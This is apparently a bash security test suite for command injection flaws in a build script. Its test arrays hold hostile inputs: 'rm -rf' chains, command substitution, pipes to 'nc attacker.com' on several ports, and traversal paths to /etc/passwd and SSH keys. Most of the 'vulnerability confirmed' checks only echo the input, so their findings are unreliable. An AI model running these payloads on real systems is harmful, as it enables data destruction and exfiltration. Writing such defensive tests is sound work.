#!/bin/bash
# test/test_build_script_security.sh - Security test suite for shell command injection vulnerabilities
# Issue #77: [SECURITY] Shell command injection vulnerability in build scripts

set -euo pipefail

# Test framework configuration
TEST_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$TEST_DIR")"
TOOLS_DIR="$PROJECT_ROOT/tools"
BUILD_SCRIPT="$TOOLS_DIR/build_fortui.sh"
TEST_CACHE_DIR="/tmp/fortui_security_test_$$"

# Test results tracking
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Security test framework functions
setup_security_test_env() {
    # Given: Isolated security test environment
    export GUI_CACHE="$TEST_CACHE_DIR"
    export RAYLIB_ROOT="$TEST_CACHE_DIR/raylib"
    export DEBUG=0
    mkdir -p "$TEST_CACHE_DIR"
    mkdir -p "$TEST_CACHE_DIR/raylib/include"
    
    # Create test lock file directory for PID injection tests
    mkdir -p "$TEST_CACHE_DIR/locks"
}

teardown_security_test_env() {
    # Clean up security test environment
    rm -rf "$TEST_CACHE_DIR" || true
    unset GUI_CACHE RAYLIB_ROOT DEBUG
}

assert_security_vulnerability_exists() {
    # Given: Potentially vulnerable code pattern
    # When: Testing with malicious input
    # Then: Test PASSES if vulnerability exists (RED phase requirement)
    local test_name="$1"
    local malicious_input="$2"
    local vulnerability_test_command="$3"
    local message="${4:-"Security vulnerability should exist: $test_name"}"
    
    TESTS_RUN=$((TESTS_RUN + 1))
    
    echo -e "${BLUE}Testing vulnerability:${NC} $test_name"
    echo -e "${BLUE}Malicious input:${NC} $malicious_input"
    
    # Execute vulnerability test - we EXPECT this to be vulnerable (RED phase)
    if eval "$vulnerability_test_command" >/dev/null 2>&1; then
        echo -e "${GREEN}✓${NC} $message (VULNERABILITY CONFIRMED - needs fixing)"
        TESTS_PASSED=$((TESTS_PASSED + 1))
    else
        echo -e "${RED}✗${NC} $message (vulnerability test failed - check test setup)"
        TESTS_FAILED=$((TESTS_FAILED + 1))
    fi
}

assert_injection_blocked() {
    # Given: Security-hardened function
    # When: Testing with malicious input
    # Then: Test PASSES if injection is blocked (GREEN phase requirement)
    local test_name="$1"
    local malicious_input="$2"
    local security_test_command="$3"
    local message="${4:-"Injection should be blocked: $test_name"}"
    
    TESTS_RUN=$((TESTS_RUN + 1))
    
    echo -e "${BLUE}Testing security fix:${NC} $test_name"
    echo -e "${BLUE}Attack vector:${NC} $malicious_input"
    
    # Execute security test - we EXPECT this to be secure (GREEN phase)
    if ! eval "$security_test_command" >/dev/null 2>&1; then
        echo -e "${GREEN}✓${NC} $message (SECURE)"
        TESTS_PASSED=$((TESTS_PASSED + 1))
    else
        echo -e "${RED}✗${NC} $message (STILL VULNERABLE)"
        TESTS_FAILED=$((TESTS_FAILED + 1))
    fi
}

# Create malicious test files for vulnerability testing
create_malicious_lock_file() {
    local lock_dir="$1"
    local malicious_content="$2"
    
    mkdir -p "$lock_dir"
    echo "$malicious_content" > "$lock_dir/cache.lock"
}

create_malicious_raylib_header() {
    local raylib_dir="$1"
    local malicious_version="$2"
    
    mkdir -p "$raylib_dir/include"
    cat > "$raylib_dir/include/raylib.h" << EOF
#ifndef RAYLIB_H
#define RAYLIB_H
// Malicious version string for injection testing
#define RAYLIB_VERSION "$malicious_version"
#endif
EOF
}

# Mock functions that simulate vulnerable patterns
mock_vulnerable_pid_read() {
    # VULNERABLE: Unquoted command substitution
    local lock_file="$1"
    local lock_pid
    lock_pid=$(cat "$lock_file" 2>/dev/null)
    echo "$lock_pid"
}

mock_vulnerable_pkg_config() {
    # VULNERABLE: Unquoted command expansion
    local malicious_output="$1"
    echo "$malicious_output"
}

mock_vulnerable_version_extract() {
    # VULNERABLE: Path injection in grep command
    local raylib_root="$1"
    local version
    version=$(grep -oE '#define RAYLIB_VERSION "[0-9]+\.[0-9]+\.[0-9]+"' \
        "${raylib_root}/include/raylib.h" 2>/dev/null | \
        grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    echo "$version"
}

# Security Test Cases for Issue #77 Vulnerabilities

# Vulnerability 1: PID Lock File Command Injection (build_fortui.sh:105)
test_pid_lock_file_command_injection() {
    echo -e "\n${YELLOW}=== Testing PID Lock File Command Injection (Line 105) ===${NC}"
    
    # Given: Lock file contains malicious command injection
    local malicious_commands=(
        '123; rm -rf /tmp/test_target'
        '$(echo "injected_command_executed")'
        '`touch /tmp/injection_marker`'
        '123 && echo "command_chaining"'
        '123 | nc attacker.com 4444'
    )
    
    for malicious_cmd in "${malicious_commands[@]}"; do
        # When: Creating lock file with malicious PID content
        create_malicious_lock_file "$TEST_CACHE_DIR/locks" "$malicious_cmd"
        
        # Then: Vulnerable code should execute the malicious command
        assert_security_vulnerability_exists \
            "PID file injection: $malicious_cmd" \
            "$malicious_cmd" \
            "mock_vulnerable_pid_read '$TEST_CACHE_DIR/locks/cache.lock'" \
            "Lock file PID injection vulnerability exists"
    done
}

# Vulnerability 2: pkg-config Output Command Injection (build_fortui.sh:832)
test_pkg_config_output_injection() {
    echo -e "\n${YELLOW}=== Testing pkg-config Output Command Injection (Line 832) ===${NC}"
    
    # Given: pkg-config returns malicious output
    local malicious_outputs=(
        '-lraylib; rm -rf /tmp/test_target'
        '-lraylib $(echo "pkg_config_injection")'
        '-lraylib `touch /tmp/pkg_injection_marker`'
        '-lraylib && malicious_command'
        '-lraylib | nc attacker.com 5555'
    )
    
    for malicious_output in "${malicious_outputs[@]}"; do
        # When: pkg-config returns malicious flags
        # Then: Unquoted expansion should execute malicious commands
        assert_security_vulnerability_exists \
            "pkg-config injection: $malicious_output" \
            "$malicious_output" \
            "mock_vulnerable_pkg_config '$malicious_output'" \
            "pkg-config output injection vulnerability exists"
    done
}

# Vulnerability 3: RAYLIB_ROOT Path Injection (build_fortui.sh:357-360)
test_raylib_root_path_injection() {
    echo -e "\n${YELLOW}=== Testing RAYLIB_ROOT Path Injection (Lines 357-360) ===${NC}"
    
    # Given: RAYLIB_ROOT contains malicious path elements
    local malicious_paths=(
        "$TEST_CACHE_DIR/raylib; rm -rf /tmp/test_target #"
        "$TEST_CACHE_DIR/raylib\$(echo \"path_injection\")"
        "$TEST_CACHE_DIR/raylib\`touch /tmp/path_injection_marker\`"
        "$TEST_CACHE_DIR/raylib && malicious_path_command"
        "$TEST_CACHE_DIR/raylib | nc attacker.com 6666"
    )
    
    for malicious_path in "${malicious_paths[@]}"; do
        # When: RAYLIB_ROOT contains malicious path
        create_malicious_raylib_header "$malicious_path" "4.5.0"
        export RAYLIB_ROOT="$malicious_path"
        
        # Then: Path injection in grep command should execute malicious code
        assert_security_vulnerability_exists \
            "RAYLIB_ROOT injection: $malicious_path" \
            "$malicious_path" \
            "mock_vulnerable_version_extract '$malicious_path'" \
            "RAYLIB_ROOT path injection vulnerability exists"
        
        unset RAYLIB_ROOT
    done
}

# Advanced Attack Scenarios
test_environment_variable_pollution() {
    echo -e "\n${YELLOW}=== Testing Environment Variable Pollution Attacks ===${NC}"
    
    # Given: Environment variables contain malicious content
    local malicious_env_vars=(
        "GUI_CACHE=$TEST_CACHE_DIR;\$(echo 'env_pollution')"
        "DEBUG=1; rm -rf /tmp/test_target"
        "RAYLIB_ROOT=$TEST_CACHE_DIR/raylib\`malicious_env_cmd\`"
    )
    
    for malicious_env in "${malicious_env_vars[@]}"; do
        # When: Environment contains malicious values
        # Then: Environment variable expansion should be vulnerable
        assert_security_vulnerability_exists \
            "Environment pollution: $malicious_env" \
            "$malicious_env" \
            "eval 'echo \"$malicious_env\"'" \
            "Environment variable pollution vulnerability exists"
    done
}

test_command_chaining_attacks() {
    echo -e "\n${YELLOW}=== Testing Command Chaining Attack Patterns ===${NC}"
    
    # Given: Various command chaining techniques
    local chaining_attacks=(
        "123 && echo 'chained_command'"
        "123 || echo 'alternative_command'"
        "123; echo 'sequential_command'"
        "123 | echo 'piped_command'"
        "123 & echo 'background_command'"
    )
    
    for attack in "${chaining_attacks[@]}"; do
        # When: Using command chaining patterns
        create_malicious_lock_file "$TEST_CACHE_DIR/chaining" "$attack"
        
        # Then: Command chaining should be possible with current vulnerable code
        assert_security_vulnerability_exists \
            "Command chaining: $attack" \
            "$attack" \
            "mock_vulnerable_pid_read '$TEST_CACHE_DIR/chaining/cache.lock'" \
            "Command chaining vulnerability exists"
    done
}

test_special_character_injection() {
    echo -e "\n${YELLOW}=== Testing Special Character Injection ===${NC}"
    
    # Given: Special characters that can break command parsing
    local special_chars=(
        $'123\necho "newline_injection"'
        $'123\techo "tab_injection"'
        "123'echo \"single_quote_injection\""
        '123"echo "double_quote_injection"'
        '123$echo "dollar_injection"'
        '123*echo "glob_injection"'
    )
    
    for special_char in "${special_chars[@]}"; do
        # When: Using special characters in input
        create_malicious_lock_file "$TEST_CACHE_DIR/special" "$special_char"
        
        # Then: Special character handling should be vulnerable
        assert_security_vulnerability_exists \
            "Special character injection: $(printf '%q' "$special_char")" \
            "$special_char" \
            "mock_vulnerable_pid_read '$TEST_CACHE_DIR/special/cache.lock'" \
            "Special character injection vulnerability exists"
    done
}

# Input Validation Security Tests
test_path_traversal_attacks() {
    echo -e "\n${YELLOW}=== Testing Path Traversal Attack Vectors ===${NC}"
    
    # Given: Path traversal patterns
    local traversal_paths=(
        "$TEST_CACHE_DIR/../../../etc/passwd"
        "$TEST_CACHE_DIR/raylib/../../../../bin/sh"
        "$TEST_CACHE_DIR/./../../sensitive_file"
        "/tmp/../../../root/.ssh/id_rsa"
    )
    
    for traversal_path in "${traversal_paths[@]}"; do
        # When: Using path traversal in RAYLIB_ROOT
        export RAYLIB_ROOT="$traversal_path"
        
        # Then: Path traversal should be possible with current code
        assert_security_vulnerability_exists \
            "Path traversal: $traversal_path" \
            "$traversal_path" \
            "echo 'Path accepted: $RAYLIB_ROOT'" \
            "Path traversal vulnerability exists"
        
        unset RAYLIB_ROOT
    done
}

# Test for secure implementations (these should FAIL in RED phase, PASS in GREEN phase)
test_secure_pid_validation() {
    echo -e "\n${YELLOW}=== Testing Secure PID Validation (Future Implementation) ===${NC}"
    
    # This test documents what the secure implementation should do
    # During RED phase: This test should FAIL (no secure implementation exists)
    # During GREEN phase: This test should PASS (secure implementation exists)
    
    assert_injection_blocked \
        "Secure PID validation" \
        "123; rm -rf /tmp" \
        "false" \
        "RED PHASE: Secure PID validation not yet implemented"
}

test_secure_pkg_config_handling() {
    echo -e "\n${YELLOW}=== Testing Secure pkg-config Output Handling (Future Implementation) ===${NC}"
    
    # This test documents what the secure implementation should do
    assert_injection_blocked \
        "Secure pkg-config handling" \
        "-lraylib; rm -rf /tmp" \
        "false" \
        "RED PHASE: Secure pkg-config handling not yet implemented"
}

test_secure_path_validation() {
    echo -e "\n${YELLOW}=== Testing Secure Path Validation (Future Implementation) ===${NC}"
    
    # This test documents what the secure implementation should do
    assert_injection_blocked \
        "Secure path validation" \
        "/etc/passwd/../../../bin/sh" \
        "false" \
        "RED PHASE: Secure path validation not yet implemented"
}

# Test runner
run_security_tests() {
    echo -e "${BLUE}Starting build script security test suite...${NC}"
    echo -e "${BLUE}Testing vulnerabilities identified in Issue #77${NC}\n"
    
    # Setup security test environment
    setup_security_test_env
    
    # RED Phase Tests - These should PASS (confirming vulnerabilities exist)
    echo -e "${RED}=== RED PHASE: Confirming Security Vulnerabilities Exist ===${NC}"
    test_pid_lock_file_command_injection
    test_pkg_config_output_injection
    test_raylib_root_path_injection
    test_environment_variable_pollution
    test_command_chaining_attacks
    test_special_character_injection
    test_path_traversal_attacks
    
    # GREEN Phase Tests - These should FAIL in RED phase, PASS after fixes
    echo -e "${GREEN}=== GREEN PHASE EXPECTATIONS: Security Fixes (Not Yet Implemented) ===${NC}"
    test_secure_pid_validation
    test_secure_pkg_config_handling
    test_secure_path_validation
    
    # Cleanup
    teardown_security_test_env
    
    # Results
    echo -e "\n${BLUE}=== Security Test Results ===${NC}"
    echo "Total security tests run: $TESTS_RUN"
    echo -e "Vulnerabilities confirmed: ${GREEN}$TESTS_PASSED${NC}"
    
    if [[ $TESTS_FAILED -gt 0 ]]; then
        echo -e "Test setup failures: ${RED}$TESTS_FAILED${NC}"
    else
        echo -e "Test setup failures: $TESTS_FAILED"
    fi
    
    echo -e "\n${YELLOW}=== Security Assessment Summary ===${NC}"
    echo -e "${RED}CRITICAL:${NC} Multiple shell command injection vulnerabilities confirmed"
    echo -e "${RED}IMPACT:${NC} Arbitrary command execution during build process"
    echo -e "${YELLOW}NEXT:${NC} Implement security fixes to make GREEN phase tests pass"
    
    # In RED phase, having vulnerabilities is expected
    if [[ $TESTS_PASSED -gt 0 ]]; then
        echo -e "\n${GREEN}RED PHASE SUCCESS:${NC} Security vulnerabilities confirmed for fixing"
        return 0
    else
        echo -e "\n${RED}RED PHASE FAILURE:${NC} Unable to confirm vulnerabilities - check test setup"
        return 1
    fi
}

# Main execution
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    run_security_tests
fi